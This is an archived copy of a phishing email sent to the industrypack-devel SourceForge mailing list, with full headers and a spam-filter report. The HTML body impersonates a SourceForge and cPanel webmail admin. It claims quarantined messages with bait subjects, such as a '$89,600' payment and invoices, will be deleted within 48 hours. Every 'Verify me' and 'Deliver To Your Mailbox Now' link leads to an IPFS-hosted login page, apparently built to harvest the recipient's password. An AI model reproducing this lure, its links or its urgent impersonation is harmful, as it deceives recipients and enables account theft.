Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 922386FEF07
	for <lists+industrypack-devel@lfdr.de>; Thu, 11 May 2023 11:44:46 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1px2qr-0000TG-1v
	for lists+industrypack-devel@lfdr.de;
	Thu, 11 May 2023 09:44:45 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <Admin@lists.sourceforge.net>) id 1px2qm-0000T9-TG
 for industrypack-devel@lists.sourceforge.net;
 Thu, 11 May 2023 09:44:41 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=P0a1ZE5lLHDtCohwXHxndKXE0RwpJoXAcWdd50BiyGc=; b=csUyvPcZE4pa4mSnJGk/qMJRY6
 V/E4ZwGTkgvD58Gw+5HcLmtvjjVE8bAvBP5ZU6+h5/AHLytXm9O4p8sVvrY/AfQmDT8erOJ+fdR0P
 3U3+2ySjyt3x4/IvQQ2peCQgONtPlAYTKSK9fEBK/hwbx/gqis0gELRUSiWiousnhJCI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=P0a1ZE5lLHDtCohwXHxndKXE0RwpJoXAcWdd50BiyGc=; b=I
 Jn9wiGc4UlJJPRY1xM6XDirW4Pywsgo35ksuD6Ry0iHa44CCHnKM+u2ZSJUdAncNpIi/yfcYGnXLl
 yGbmGW+d3Q3ZMGcQXD0DjCUNKCfgzIs8OEfBTPKStp70CfYb5ukBdIREj2vOK6viKI3mzshHc5+h+
 dBDX5XSOynOhkgus=;
Received: from bis-vps.live ([185.81.128.114])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1px2qj-003AGN-5Z for industrypack-devel@lists.sourceforge.net;
 Thu, 11 May 2023 09:44:40 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 11 May 2023 11:38:41 +0200
Message-ID: <20230511113841.8625813BF7B182DC@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 8.8 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Dear industrypack-devel Kindly Note: Your incoming messages
 have been placed on hold by your administrative lists.sourceforge.net This
 pending messages will be deleted automatically after 48hours if you fail
 to verify your account... 
 Content analysis details:   (8.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?185.81.128.114>]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [185.81.128.114 listed in zen.spamhaus.org]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 LOTS_OF_MONEY          Huge... sums of money
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 0.0 TVD_PH_SUBJ_META       No description available.
 1.8 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1px2qj-003AGN-5Z
Subject: [Industrypack-devel] [SPAM]
 =?UTF-8?B?Tk9USUNFOiBOZXcgVGlja2V0IE5vOiBb8J+TqSAxMSBNb3JlXSBJbmNvbWluZyBNYWlscyBGYWlsZWQgVG8gRGVsaXZlciBUbyBZb3VyIE1haWxib3gg?=industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Admin--- via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Admin@lists.sourceforge.net
Content-Type: multipart/mixed; boundary="===============4945093506845899836=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4945093506845899836==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 10.00.9200.16384">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div id=3D"forwardbody1">
<div style=3D"margin: 0.5em;">
<div><span style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;=
"><br>
<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
letter-spacing: normal; font-family: "Times New Roman"; font-size: medium; =
font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
l; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
l; text-decoration-style: initial; text-decoration-color: initial;'>
<span style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">Dea=
r industrypack-devel<br><br>Kindly Note: Your incoming messages have been p=
laced on hold by&nbsp;your administrative lists.sourceforge.net</span></div=
>
<div class=3D"v1v1ydpe41a34dcyahoo_quoted" id=3D"v1v1ydpe41a34dcyahoo_quote=
d_8180004419" style=3D'color: rgb(0, 0, 0); text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; font-family: "Times New Roman"; font-size:=
 medium; font-style: normal; font-weight: 400; word-spacing: 0px; white-spa=
ce: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-var=
iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
s: initial; text-decoration-style: initial;=20
text-decoration-color: initial;'><div style=3D'color: rgb(38, 40, 42); font=
-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px;'>=
<div><div class=3D"v1v1ydpfb2a13d5yahoo-style-wrap" style=3D'font-family: "=
Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px;'><div id=3D=
"v1v1ydpfb2a13d5yiv9234107129"><div class=3D"v1v1ydpfb2a13d5yiv9234107129yd=
pa75581bayahoo-style-wrap" style=3D'font-family: "Helvetica Neue", Helvetic=
a, Arial, sans-serif; font-size: 13px;'><div dir=3D"ltr">
<div style=3D"color: rgb(44, 54, 58); padding-top: 0px; font-family: Arial,=
 sans-serif; border-top-width: 0px;" dir=3D"ltr"><div><div style=3D"color: =
rgb(44, 54, 58); font-family: Arial, sans-serif;">This pending messages wil=
l be deleted automatically after&nbsp;48hours if you fail to verify your ac=
count...<br>
<p align=3D"left" style=3D'margin: 20px 0px; padding: 0px; color: rgb(34, 3=
4, 34); line-height: 1.3; font-family: "Helvetica Neue", Helvetica, Arial, =
Geneva, sans-serif; font-size: 14px; background-color: rgb(240, 240, 240);'=
>We need to verify your&nbsp;industrypack-devel@lists.sourceforge.net addre=
ss on our&nbsp;platform your Click&nbsp;on the Verification&nbsp;button bel=
low...</p></div></div></div></div></div></div></div></div></div></div></spa=
n></div>
<div class=3D"v1v1ydpe41a34dcyahoo_quoted" id=3D"v1v1ydpe41a34dcyahoo_quote=
d_8180004419"><div style=3D'color: rgb(38, 40, 42); font-family: "Helvetica=
 Neue", Helvetica, Arial, sans-serif; font-size: 13px;'><div><div class=3D"=
v1v1ydpfb2a13d5yahoo-style-wrap" style=3D"font-family: Helvetica Neue, Helv=
etica, Arial, sans-serif; font-size: 13px;"><div id=3D"v1v1ydpfb2a13d5yiv92=
34107129">
<div class=3D"v1v1ydpfb2a13d5yiv9234107129ydpa75581bayahoo-style-wrap" styl=
e=3D"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: =
13px;"><div dir=3D"ltr"><div style=3D"color: rgb(44, 54, 58); padding-top: =
0px; font-family: Arial, sans-serif; border-top-width: 0px;" dir=3D"ltr"><d=
iv><div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">
<table style=3D"padding: 0px; width: 150px; color: rgb(34, 34, 34); font-fa=
mily: Helvetica Neue, Helvetica, Arial, Geneva, sans-serif; font-size: 14px=
; vertical-align: top; border-collapse: collapse; background-color: rgb(240=
, 240, 240);">
<tbody>
<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;">
<td width=3D"150" height=3D"35" align=3D"center" valign=3D"middle" style=3D=
"background: rgb(108, 199, 39); padding: 0px; width: 150px; text-align: cen=
ter; color: rgb(255, 255, 255); line-height: 1.3; vertical-align: middle; d=
isplay: block; border-collapse: collapse;" bgcolor=3D"#6cc727">
<a style=3D"border-width: 0px; margin: 0px; padding: 0px; width: 134px; hei=
ght: 35px; color: rgb(255, 255, 255); line-height: 35px; font-family: inher=
it; font-size: 18px; vertical-align: baseline; display: inline-block; font-=
stretch: inherit; background-color: transparent;" href=3D"https://fleek.ipf=
s.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filename=3Dlogin.h=
tml#industrypack-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noop=
ener noreferrer">&#10003; Verify me</a></td></tr></tbody></table></div>
<p style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif; margin-=
top: 0px;">
From Now<span style=3D"color: rgb(44, 54, 58); text-transform: none; text-i=
ndent: 0px; letter-spacing: normal; font-family: Arial, sans-serif; font-si=
ze: 13px; font-style: normal; font-weight: 400; word-spacing: 0px; float: n=
one; display: inline !important; white-space: normal; orphans: 2; widows: 2=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;">
&nbsp;</span><span style=3D"color: rgb(44, 54, 58); text-transform: none; t=
ext-indent: 0px; letter-spacing: normal; font-family: Arial, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: bolder; word-spacing: 0px; =
white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style: initial; text-decoration-color:=
 initial;">(11th of&nbsp;May 2023)</span></p><u>
</u><div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">=
<u>
</u><div style=3D"margin: 0px; padding: 0px; font-family: arial, helvetica,=
 sans-serif; font-size: small; border-top-width: 0px;"><u>
</u><a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKN=
XgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourceforge.ne=
t">
</a><a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKN=
XgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourceforge.ne=
t">
</a><table style=3D"border-width: 0px; width: 927px; height: 189px; line-he=
ight: normal; font-family: verdana, arial, sans-serif; font-size: 11px; bor=
der-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<thead>
<tr>
<th style=3D"margin: 0px; padding: 4px 6px; width: 109px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
ground-color: rgb(251, 251, 251);">&nbsp;</th>
<th style=3D"margin: 0px; padding: 4px 6px; width: 168px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
ground-color: rgb(251, 251, 251);">Recipient:</th>
<th style=3D"margin: 0px; padding: 4px 6px; width: 203px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170=
, 170, 170); border-top-width: 1px; border-right-width: 1px; border-left-wi=
dth: 1px; border-top-style: solid; border-right-style: solid; border-left-s=
tyle: solid; background-color: rgb(251, 251, 251);">
<table style=3D"width: 210px; height: 23px; border-collapse: collapse;" bor=
der=3D"1">
<tbody>
<tr>
<td style=3D"width: 199px;">Subject:</td></tr></tbody></table></th></tr></t=
head>
<thead>
<tr>
<th style=3D"margin: 0px; padding: 4px; width: 687px; text-align: left; col=
or: rgb(255, 255, 255); font-weight: normal; background-color: rgb(0, 0, 10=
0);" colspan=3D"4"><span style=3D"font-weight: bolder;">Quarantined ( indus=
trypack-devel@lists.sourceforge.net&nbsp;)</span></th></tr></thead>
<tbody>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 111px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap;"><span style=3D"color: rgb(60, 149, 195);"><u><a href=3D"https:=
//fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filenam=
e=3Dlogin.html#industrypack-devel@lists.sourceforge.net">Deliver To Your Ma=
ilbox Now</a></u></span></td>
<td style=3D"padding: 5px; width: 169px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;">&nbsp;(
 industrypack-devel@lists.sourceforge.net&nbsp;)</td>
<td style=3D"padding: 5px; width: 205px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;"><a href=
=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtz=
Dk?filename=3Dlogin.html#industrypack-devel@lists.sourceforge.net">RE: Last=
 Payment of this Month $89,600</a> </td>
<td style=3D"padding: 5px; width: 165px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap;">
<span style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: verdana, arial, sans-serif; font-size=
: 11px; font-style: normal; font-weight: 700; word-spacing: 0px; float: non=
e; display: inline !important; white-space: nowrap; orphans: 2; widows: 2; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;">
(10th&nbsp;May 2023)</span></td></tr>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 111px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap;"><a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGa=
ntZRzffKNXgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourc=
eforge.net">Deliver To Your Mailbox Now</a></td>
<td style=3D"padding: 5px; width: 169px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;">&nbsp;(
 industrypack-devel@lists.sourceforge.net&nbsp;&nbsp;)</td>
<td style=3D"padding: 5px; width: 205px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;"><span st=
yle=3D"color: rgb(21, 96, 189);"><u><a href=3D"https://fleek.ipfs.io/ipfs/Q=
md5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filename=3Dlogin.html#industr=
ypack-devel@lists.sourceforge.net">Re:Feb&nbsp;Contract&nbsp;amendment form=
=2EPdf</a></u></span></td>
<td style=3D"padding: 5px; width: 165px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap;"><strong>(08th</strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">&nbsp;May 2023<=
/strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">)</strong></td>=
</tr>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 111px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap;"><a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGa=
ntZRzffKNXgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourc=
eforge.net">Deliver To Your Mailbox Now</a></td>
<td style=3D"padding: 5px; width: 169px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;">&nbsp;(
 industrypack-devel@lists.sourceforge.net&nbsp;&nbsp;)</td><td style=3D"pad=
ding: 5px; width: 205px; border-top-color: rgb(170, 170, 170); border-left-=
color: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; b=
order-top-style: solid; border-left-style: solid;">
<a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjp=
pzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourceforge.net">F=
W: Re: Proforma invoice No:-00257</a></td>
<td style=3D"padding: 5px; width: 165px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap;"><strong>(07th</strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">&nbsp;May 2023<=
/strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">)</strong></td>=
</tr>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 111px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap;"><a href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGa=
ntZRzffKNXgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@lists.sourc=
eforge.net">Deliver To Your Mailbox Now</a></td>
<td style=3D"padding: 5px; width: 170px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid;">&nbsp;(
 industrypack-devel@lists.sourceforge.net&nbsp;&nbsp;)</td><td style=3D"pad=
ding: 5px; width: 205px; border-top-color: rgb(170, 170, 170); border-left-=
color: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px; b=
order-top-style: solid; border-left-style: solid;"><span style=3D"color: rg=
b(95, 158, 160);"><span style=3D"color: rgb(0, 71, 171);"><a href=3D"https:=
//fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filenam=
e=3Dlogin.html#industrypack-devel@lists.sourceforge.net"><strong>
</strong></a><span style=3D"color: rgb(0, 71, 171);"><a href=3D"https://fle=
ek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filename=3Dl=
ogin.html#industrypack-devel@lists.sourceforge.net"></a><a href=3D"https://=
fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filename=
=3Dlogin.html#industrypack-devel@lists.sourceforge.net">Re: FW: Statement o=
f account at as 08/04/2023</a></span></span></span></td>
<td style=3D"padding: 5px; width: 167px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap;"><strong>(04nd</strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">&nbsp;May 2023<=
/strong>
<strong style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: verdana, arial, sans-serif; font-si=
ze: 11px; font-style: normal; word-spacing: 0px; white-space: nowrap; orpha=
ns: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial;">)</strong></td>=
</tr></tbody></table></div>
<span style=3D"color: rgb(255, 0, 0); font-family: arial; font-size: 12px; =
font-weight: bolder;"><span style=3D"color: rgb(85, 85, 85);"><br><br>Note =
: This message was sent by your admin</span>
&nbsp;<span style=3D"color: rgb(192, 64, 0);">cPanel</span><span style=3D"c=
olor: rgb(85, 85, 85);">&nbsp;notification only.</span>&nbsp;Please do not =
reply<br><br style=3D"color: rgb(51, 51, 51); font-family: times new roman;=
 font-size: medium;">Regards<br><a style=3D"color: rgb(0, 172, 255); backgr=
ound-color: transparent;" href=3D"https://fleek.ipfs.io/ipfs/Qmd5vaabhUUwd9=
m64Y9rcXGantZRzffKNXgjppzpCqtzDk?filename=3Dlogin.html#industrypack-devel@l=
ists.sourceforge.net" target=3D"_blank" rel=3D"noopener noreferrer">lists.s=
ourceforge.net</a>
&nbsp;<span style=3D"color: rgb(192, 64, 0);">&nbsp;&nbsp;webmail</span> &n=
bsp;Team</span></div>
<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;"><spa=
n style=3D"color: rgb(255, 0, 0); font-family: arial; font-size: 12px; font=
-weight: bolder;"><span style=3D"color: rgb(51, 51, 51); font-family: lucid=
a grande, verdana, arial, helvetica, sans-serif; font-size: 11px;">&#9400; =
2023&nbsp;<span style=3D"font-weight: bolder;">&nbsp;<span style=3D"color: =
rgb(192, 64, 0); font-family: arial; font-size: 16px;">cPanel</span></span>=

 &nbsp;&nbsp;<span style=3D"color: rgb(77, 81, 86); font-family: arial, san=
s-serif; font-size: 14px; font-weight: 400;"><span style=3D"color: rgb(192,=
 64, 0); font-size: 11px;">&reg;</span></span>&nbsp;&nbsp;. All Rights Rese=
rved.</span></span></div></div></div></div></div></div></div></div></div></=
div></div></div>
<div id=3D"_rc_sig"></div></body></html>


--===============4945093506845899836==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4945093506845899836==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4945093506845899836==--
